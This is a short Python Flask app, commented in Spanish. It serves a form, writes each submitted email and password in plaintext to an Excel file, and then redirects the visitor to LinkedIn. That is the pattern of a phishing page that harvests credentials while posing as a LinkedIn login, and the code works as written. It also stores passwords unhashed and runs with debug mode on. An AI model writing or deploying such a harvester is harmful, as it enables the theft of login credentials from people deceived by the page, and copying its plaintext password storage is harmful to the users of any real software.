
from flask import Flask, render_template, request, redirect
import openpyxl

app = Flask(__name__)

# Ruta del archivo Excel donde se guardarán los datos
EXCEL_FILE = 'users.xlsx'

# Función para crear el archivo Excel si no existe
def create_excel_file():
    try:
        workbook = openpyxl.load_workbook(EXCEL_FILE)
    except FileNotFoundError:
        workbook = openpyxl.Workbook()
        sheet = workbook.active
        sheet.title = "Usuarios"
        sheet.append(["Correo Electrónico", "Contraseña"])  # Encabezados de la hoja
        workbook.save(EXCEL_FILE)

# Ruta para mostrar el formulario
@app.route('/', methods=['GET'])
def form():
    return render_template('form.html')

# Ruta para procesar los datos del formulario
@app.route('/', methods=['POST'])
def save_user():
    email = request.form['email']
    password = request.form['password']

    # Abrir el archivo Excel y guardar los datos
    workbook = openpyxl.load_workbook(EXCEL_FILE)
    sheet = workbook['Usuarios']
    sheet.append([email, password])
    workbook.save(EXCEL_FILE)

    # Redirigir a la página 
    return redirect("https://co.linkedin.com/")

if __name__ == '__main__':
    create_excel_file()  # Asegurarse de que el archivo Excel exista
    app.run(debug=True, port=5001)  # Cambia el puerto a 5001

